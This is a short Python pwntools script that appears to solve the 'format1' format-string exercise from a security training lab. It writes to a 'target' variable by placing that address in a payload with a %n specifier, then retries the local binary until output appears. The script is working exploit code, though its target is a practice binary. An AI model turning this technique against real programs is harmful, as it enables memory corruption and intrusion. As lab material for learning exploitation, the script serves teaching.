#!/usr/bin/env python
from pwn import *
import sys

# Because the format string comes as an argument (argv[1])
# the position where the format string resides relative to
# the stack head varies between runs. We use helper_format1.py
# to determine where it might reside

e = ELF('./format1', checksec=False)
 
target_offset = e.symbols['target']

# This number is found using helper_format1.py
position = 256

for i in range(1000):
	payload = "AAAABBBB" + p32(target_offset) + "DDDD   %" + str(position) + "$n%" + str(position+1) + "$x"

	p = process(["./format1", payload])

	try:
		print("%s"% (p.read()))
		break
	except EOFError:
		pass
	

	p.close()
